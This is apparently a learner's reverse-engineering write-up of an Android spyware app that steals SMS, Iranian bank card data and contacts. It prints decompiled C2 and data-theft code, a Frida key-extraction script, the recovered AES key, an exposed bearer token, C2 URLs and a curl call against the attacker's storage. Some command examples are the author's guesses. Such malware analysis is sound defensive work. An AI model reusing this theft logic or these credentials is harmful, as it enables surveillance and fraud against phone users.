## Lets first analyse the activites and services present in the app using JADX. 

We see multiple activites and services and few stand very suspicious :

![images](images/susAct.png)

## Let's have a look at the permissions requested by the app in the Manifest file:

![images](images/manifestPerms.png)

This app requests an unusually large number of permissions, many of which are highly invasive and typical of spyware, banking trojans, or surveillance malware.

![images](images/susPerms.png)

1) The above permissions are very common in malwares to do the listed actions. 

2) Below are few permissions which may lead to potential frauds : 

![images](images/susPerms2.png)

## Now let's breakdown the MainActivity :

![images](images/ManifestMA.png)

```
private boolean areAllPermissionsGranted() {
        return fj.a(this, "android.permission.READ_CONTACTS") == 0 && fj.a(this, "android.permission.CALL_PHONE") == 0 && fj.a(this, "android.permission.READ_SMS") == 0 && fj.a(this, "android.permission.RECEIVE_SMS") == 0 && fj.a(this, "android.permission.SEND_SMS") == 0;
    }
```

- Makes sure that the above permissions are given before starting the app , if these permissions aren't given then the user cannot use the app (**THE USER IS FORCED TO TURN ON THESE PERMISSIONS**)


- If we check the "usage" of the function, it is used in the method `requestPermissions`, which is called in the OnCreate method.

![image](images/permissionfuncUsage.png)
![image](images/OnCreate.png)

- If the permissions are all given , it calls another method `fetchAppConfiguration`.

Let's look into the fetchAppConfiguration method :

```
private void fetchAppConfiguration() {
        try {
            String address = deviceUtils.getAddress();
            String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());
            final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
            asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
            asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
            asyncHttpClient.get(address, new AsyncHttpResponseHandler() { // from class: com.errorforcode.netix.MainActivity.1
                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onFailure(int i, Header[] headerArr, byte[] bArr, Throwable th) {
                    Toast.makeText(MainActivity.this.context, "Fetch address error: " + i, 1).show();
                    MainActivity.this.finish();
                }

                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
```
- This is a pretty suspicious function because of the following reasons :

![images](images/fakeURLget.png)

- If we go to the definition of the `deviceUtils.getAddress` definition : 

```
 public String getAddress() throws Exception {
        StringBuilder sb = new StringBuilder("https://");
        String decrypt = AESEncrypt.decrypt(readAssets("core.txt"), Decrypt.getSecretKey());
        String decrypt2 = AESEncrypt.decrypt(readAssets("acc.txt"), Decrypt.getSecretKey());
        String decrypt3 = AESEncrypt.decrypt(readAssets("ns.txt"), Decrypt.getSecretKey());
        sb.append(decrypt);
        sb.append("/client/v4/accounts/");
        sb.append(decrypt2);
        sb.append("/storage/kv/namespaces/");
        sb.append(decrypt3);
        sb.append("/values/test");
        return sb.toString();
    }
```
We see that the URL is being extracted from various files from the `assets` folder and then decrypted using a secret key. 

Let's try to find the URL: 

The contents in the :

- core.txt : Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF
- acc.txt : 0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A==
- ns.txt : i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg==

Now, lets try to find the secret key : 

![image](images/keynative.png)

Below is the Frida Script to find the secret key from the native file (**libnetix.so**):

```
Java.perform(function () {
    const Decrypt = Java.use("com.errorforcode.netix.Utils.Encrypt.Decrypt");
    const nativeGetSecretKey = Module.findExportByName("libnetix.so", "Java_com_errorforcode_netix_Utils_Encrypt_Decrypt_getSecretKey");
    
    if (nativeGetSecretKey) {
        Interceptor.attach(nativeGetSecretKey, {
            onLeave: function (retval) {
                const env = Java.vm.getEnv();
                const key = env.getStringUtfChars(retval, null).readCString();
                console.log("\n[+] REAL SECRET KEY:", key, "\n");       
            }
        });
    } else {
        console.error("[-] Error: libnetix.so or getSecretKey() not found!");
    }
});
```

![image](images/secretKey.png)

`&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C` -> This is the secret key.

Once the key is found , we can decrypt the URL. The python script for the same is given below.

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_aes(encrypted_data, key):
    encrypted_bytes = base64.b64decode(encrypted_data)
    key_bytes = key.encode('utf-8')
    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    return decrypted.decode('utf-8')

key = "&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C"
core_enc = "Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF"
acc_enc = "0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A=="
ns_enc = "i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg=="

try:
    core_decrypted = decrypt_aes(core_enc, key)
    acc_decrypted = decrypt_aes(acc_enc, key)
    ns_decrypted = decrypt_aes(ns_enc, key)
    url = f"https://{core_decrypted}/client/v4/accounts/{acc_decrypted}/storage/kv/namespaces/{ns_decrypted}/values/test"
    
    print("Decrypted Values:")
    print(f"core.txt: {core_decrypted}")
    print(f"acc.txt: {acc_decrypted}")
    print(f"ns.txt: {ns_decrypted}")
    print("\nConstructed URL:")
    print(url)

except Exception as e:
    print(f"Decryption failed: {str(e)}")
    print("Possible reasons:")
    print("- Incorrect key")
    print("- Different AES mode was used (e.g., ECB instead of CBC)")
    print("- Different padding scheme")
    print("- IV handling might be different in the original implementation")
```

The output url is :

**https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test**

- This is a very suspicious URL, which likely stores the stolen details. `/storage/kv/namespaces/` is Cloudflare's key-value storage API.
- Malware uses this to store stolen data persistently.

Let's go back to where we left in the MainActivity : 

`String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());`

The `decrypt` variable can be found by using the same python script as above, as the same `key` is used for decryption.

api.txt : rP79AifBcvxyHj9gInpNur3vjnnyCMK52cuMHmMUBAW9jxDSTYTAUP1gPtcfb5auT2Bps11yF1/pHPw6Dpfp6w==

`decrypt : xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF`

```
final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
```

- In general, standard apps use `HttpURLConnection` or `OkHttpClient`, and Headers are typically minimal and well-documented.
- Here, there is use of a deprecated library which is known for security vulnerabilities, and is often used in malware due to its simple async handling.
- Here, the value of `decrypt` that we found out is used as the `Bearer Token`. Generally, these API tokens are properly OAuth-generated.
- There are also missing security headers in this : 
    - No `User-Agent` 
    - No `X-Requested-With`
    - No certificate pinning (**Man in the middle attacks is very much possible**)

```
@Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
```
- now there is another URL which is trying to load, let's decode to see what URL this is.
- If we see the usage of the `OnSucess` method, it takes the output returned by the firsl URL and decrypts it , to save it in the vairable `decrypt2`.
- The domain of the url is saved in the app database, maybe so that the app remembers from when to execute the orders from even after phone restart.

Let's see what does `https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test` return : 

```
curl -X GET   "https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test"   -H "Authorization: Bearer xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF"   -H "Content-Type: application/json"
```

And we successfully get an encrypted output : `oX2m51CiKpsKMG4pEqMbN+JscM3FsuWnohtXf9ClwDTC967Qe6hTQWduWEWGz4I1`

- This can be decrypted using the same python file that we used to decrypt the other, because the same key is used to decrypt everything. 
- Once the py file is run with this encrypted URL, we get the domain **www.goqbee.space**.
- port.txt -> `-1002254644684`

Now the new constructed URL would be: **https://www.goqbee.space/users/-1002254644684/config**

When we try to open the URL, we get something like this:

![images](images/goqbee.png)

- Let's try to decode the encrypted data of the json using the same python code ..... We get `{'webview': None, 'notification': False}`.
- This clearly shows that this is the main URL through which the attacker, sends commands for the app to steal. 

Let's move on to the next function in the MainActivity:

```
public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                try {
                    JSONObject jSONObject = new JSONObject(AESEncrypt.decrypt(new JSONObject(new String(bArr)).getJSONObject("parameters").getString("encrypted"), Decrypt.getSecretKey()));
                    NetixCore.install();
                    MainActivity.database.setString("webview", jSONObject.getString("webview"));
                    MainActivity.database.setString("notification", jSONObject.getString("notification"));
                    MainActivity mainActivity = MainActivity.this;
                    mainActivity.webView = (WebView) mainActivity.findViewById(R.id.webView);
                    MainActivity mainActivity2 = MainActivity.this;
                    mainActivity2.progressBar = (ProgressBar) mainActivity2.findViewById(R.id.progressBar);
                    MainActivity.this.webView.getSettings().setJavaScriptEnabled(true);
                    MainActivity.this.webView.getSettings().setDomStorageEnabled(true);
                    MainActivity.this.webView.setWebViewClient(new WebViewClient() { // from class: com.errorforcode.netix.MainActivity.2.1
                        @Override // android.webkit.WebViewClient
                        public void onPageFinished(WebView webView, String str2) {
                            MainActivity.this.progressBar.setVisibility(8);
                            MainActivity.this.webView.setVisibility(0);
                        }

                        @Override // android.webkit.WebViewClient
                        public void onPageStarted(WebView webView, String str2, Bitmap bitmap) {
                            MainActivity.this.progressBar.setVisibility(0);
                            MainActivity.this.webView.setVisibility(8);
                        }
                    });
                    String string = jSONObject.getString("webview");
                    if (string.endsWith("/")) {
                        MainActivity.this.webView.loadUrl(string);
                        return;
                    }
                    MainActivity.this.webView.loadUrl(string + "?androidid=" + NetixCore.getAndroidId());
                    NetixCore.getAndroidId();
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
```

- The jsonObject stores the json output that we get from the mainURL.
- `NetixCore.install()`
    - Steals the device's **Firebase Cloud Messaging (FCM) token**.
    - Enables push notifications attacks(even if the app is closed).
    - Creates a unique victim profile for targeted attacks.
    - Evades detection by adapting to device specifics.
    - The data that is sent to the malicious URL is encrypted to hide the data from network monitors.
    - `database.setString("install", "true");`, this survives app updates/reboots.
- The databse sets 2 new fields, webview and notification, to store the current status of the mainURL.
- Creates a webview and a progressbar which changes based on the page being loaded. 
- The variable `string` stores the malicious webpage that is provided by the URL : **https://www.goqbee.space/users/-1002254644684/config**
- It loads the webURL secretly attaching your device ID ... the URL would look something like this : `https://phishing-site.com/login?androidid=2b9a14c3f58a1d42`


Let's move on to the next method `handleAutoStartPermission()`:

```
private void handleAutoStartPermission() {
        i9.b.getClass();
        final i9 i9Var = (i9) i9.c.a();
        Context context = this.context;
        i9Var.getClass();
        d31.k(context, "context");
        List<ApplicationInfo> installedApplications = context.getPackageManager().getInstalledApplications(0);
        d31.j(installedApplications, "pm.getInstalledApplications(0)");
        Iterator<ApplicationInfo> it = installedApplications.iterator();
        while (it.hasNext()) {
            if (i9Var.a.contains(it.next().packageName) && i9Var.c(context, false, false)) {
                try {
                    if (!database.getString("autostart").equals("true") && NetixCore.getBrand().equalsIgnoreCase("xiaomi")) {
                        database.setString("autostart", "true");
                        o3 o3Var = new o3(this);
                        ((k3) o3Var.g).d = "هشدار! برای ادامه نیاز به اعطای مجوز به برنامه دارید.";
                        String str = "برای ادامه لطفا روی دکمه 'فهمیدم' کلیک کنید و در تنظیمات گزینه auto start یا اغاز خودکار پس زمینه را برای برنامه '" + deviceUtils.getApplicationName() + "' فعال کنید.\n\n\nتوجه! در صورت رد کردن یا فعال نکردن این گزینه برنامه دچار اختلال میشود.";
                        Object obj = o3Var.g;
                        ((k3) obj).f = str;
                        DialogInterface.OnClickListener onClickListener = new DialogInterface.OnClickListener() { // from class: m50
                            @Override // android.content.DialogInterface.OnClickListener
                            public final void onClick(DialogInterface dialogInterface, int i) {
                                MainActivity.this.lambda$handleAutoStartPermission$1(i9Var, dialogInterface, i);
                            }
                        };
                        k3 k3Var = (k3) obj;
                        k3Var.g = "فهمیدم.";
                        k3Var.h = onClickListener;
                        o3Var.a().show();
                        return;
                    }
                    return;
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
```

- On inspecting `i9` class, we see that it is a **manufacturer-specific auto-start permission bypass tool** that :
    - Maintains a list of OEM-specific packages (com.miui.securitycenter, com.huawei.systemmanager, etc.)
    - Contains methods to:
        - Detect device brand (c())
        - Launch OEM-specific auto-start settings activities (b(), f())
        - Verify if activities exist (e())

- `List<ApplicationInfo> installedApplications = context.getPackageManager().getInstalledApplications(0);` gets a list of all installed apps, to check the `brand` of the device.

- `i9Var.a.contains(it.next().packageName) && i9Var.c(context, false, false)` identifies manufacturer-specific security apps that control auto-start permissions.

below are the listed security apps that belong to the list, as given in the `i9` class. 

![images](images/secrityapps.png)

- The next lines of code, checks if the malware already forced auto-start before and confirms the device is `Xiaomi`.

- `database.setString("autostart", "true");` : sets persistent flag in the malware's database.

- Custom dialog builders `o3/k3` (obfuscated)

- The persian text translates to `Warning! You need to grant permissions to continue.` `Click 'I understand' and enable auto-start for [AppName] in settings. WARNING! Rejecting or not enabling this will cause app malfunctions.`. This uses fear to non-tech users, and forces them to accept the requested permission.

- When `فهمیدم` -> "I Understand" is clicked, it triggers `lambda$handleAutoStartPermission$1`. Let's find and understnad what this function does :

![autostart](images/AutoStart1.png)
![autostart](images/AutoStart2.png)

- The above method is used to open `Auto-Start` settings, for respective phones.

```
o3Var.a().show();
return;
```

- The above code forces user interaction before allowing app use. The `return`statement ensures no further execution until resolved.

Let's look at the last important function in the activity (`initializeFirebase`):

```
private static void initializeFirebase() {
        FirebaseMessaging firebaseMessaging;
        gr grVar = FirebaseMessaging.l;
        synchronized (FirebaseMessaging.class) {
            firebaseMessaging = FirebaseMessaging.getInstance(ws.b());
        }
        fm = firebaseMessaging;
        try {
            String readAssets = deviceUtils.readAssets("sudo.txt");
            k61 k61Var = fm.h;
            m2 m2Var = new m2(11, readAssets);
            k61Var.getClass();
            u11 u11Var = sr0.a;
            k61 k61Var2 = new k61();
            k61Var.b.a(new p51(u11Var, m2Var, k61Var2));
            k61Var.o();
            k61Var2.g(new eo(3));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
```

- fm -> Firebase messaging instance in a static variable for global access.
- Reads a file "sudo.txt" -> "cejay", from app's assets folder.
- This file likely contains a `Firebase topic name` controlled by the attacker. The malware will subscribe to this topic to receive remote commands.

- Example Attack Scenario : 

```
{
  "to": "/topics/cejay",
  "data": {
    "cmd": "steal_sms",  
    "target": "all",
    "enc_key": "a1b2c3..."
  }
}
```

Let's go trough other activites and services to see what all the app steals from the user. Below are the activites that we will be looking, one by one

- BankBalance
- CardNumbers
- GetContacts
- AllSms
- LastSms
- SendToContact

**BankBalance Activity**

This activity is a `highly specialized SMS scraper` designed to steal bank account details, balances and transaction data from SMS messages on the infected device.

- This activity: 
    - Extracts bank names (e.g. Bank Mellat, Parsian Bank ... etc)
    - Grabs account numbers (using regex patterns)
    - Captures account balances (e.g., "موجودی: 10,000,000 ریال")
    - Logs transaction details (e.g., "برداشت از: 1,200,000 ریال")

```
Cursor query = NetixCore.context.getContentResolver().query(
    Uri.parse("content://sms/inbox"),
    null, null, null, null
);
```

- Reads all SMS messages
- Filters messages containing bank-related keywords.
- Uses regex pattern to find the below :
    - Account numbers (e.g., حساب: 123-456-7890123-4)
    - Card numbers (e.g., کارت 1234)
    - Transaction IDs (e.g., برداشت از: 123.456)
- Matches phrases like, `موجودی: ۵,۰۰۰,۰۰۰ ریال` and `مانده: 10,000,000`

- The stolen data are then structured in a proper format: 

```
sb.append("🏦 ʙᴀɴᴋ | " + bankName + '\n');
sb.append("📞 ᴘʜᴏɴᴇ | " + sender + '\n');
sb.append("💰 ᴡɪᴛʜᴅʀᴀᴡ | " + accountNumber + " | " + balance + "\n\n");
```

- The data is then encrypted with the hardcoded AES key (`Decrypt.getSecretKey()`) and is then sent to the C2 server via `NetixCore.sendRequest()`

**CardNumbers Activity**

1. Card Number Detection :

    - Uses regex to match `Iranian bank card numbers` (16 digits starting with known IINs)

    ```
    vi0 vi0Var = new vi0("(?:6274|2071|6273|5022|5057|5028|6221|5029|5859|6391|6278|6393|5054|6362|5058|5892|5894|6276|6037|6369|6063|6104|6219|6396|6279|6277|6395|6280|6281|6392|6367|9919)\\d{12}");
    ```


2. Bank Identification :

    - Switch based logic maps IINs to bank names.

    ![IINmatching](images/IINmatching.png)

- The data is then encrypted using the same AES key and then sent to the C2 endpoint `cardnumbers`.

![bankIIN](images/BankIIN.png)


**GetContacts Activity**

This ContactPhone class is designed to steal the victim's entire contact list and exfiltrate it to a command-and-control (C2) server.

- Uses `SendToContact.getContactList()` to retrieve all contacts from the device.
- Formats the contacts into a string with `NetixTeam header` and newline separation.

```
String str = "NetixTeam\n\n";
while (it.hasNext()) {
    Map<String, String> next = it.next();
    str += "\n" + next.get("address") + "\n";
}
```
- Creates a simple text list of all contact phone numbers/addresses.

- Uses the same AES encryption logic and send the stolen data to the C2 server under the endpoint `/allcontact` with Android ID parameter to track a specific device's contact details.


Similarly: 

- **AllSMS Activity** : Steals all the SMS from the user's device, encrypts it and sends to the C2 server.

- **LastSMS Activity** : Steals the last SMS received by the user. 

- **SendToContact** : Sends a "message" to all of the contact present in the phone, might be used by the attacker to make the contacts also "download" this app . 


## Final Thoughts :

This is a very well written and well hidden malware, through which i learnt a lot of new ways on how:

- A malicious application can hide itself and make it look like a regular working app.
- A malicious application can send data to a server in the background.
- A malicious application stores stolen data.

































